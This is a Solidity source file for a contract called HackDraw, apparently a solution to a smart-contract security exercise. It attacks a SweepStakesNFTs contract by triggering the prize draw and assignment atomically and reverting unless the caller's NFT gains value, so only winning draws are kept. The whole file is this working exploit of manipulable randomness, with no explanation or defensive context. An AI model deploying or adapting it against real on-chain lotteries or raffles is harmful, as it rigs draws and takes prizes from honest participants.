// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.9;

import "./SweepStakes.sol";

contract HackDraw {
    SweepStakesNFTs sweepstakes;
    
    constructor(address sweepstakesAddress) {
        sweepstakes = SweepStakesNFTs(sweepstakesAddress);
    }

    function hackDraw(uint256 _token) public returns (uint256) {
        uint256 val = sweepstakes.getNFTValue(_token);
        sweepstakes.drawWinner();
        sweepstakes.assignPrize();
        require(sweepstakes.getNFTValue(_token) > val, "No prize");
        return sweepstakes.getNFTValue(_token) - val;
    }
}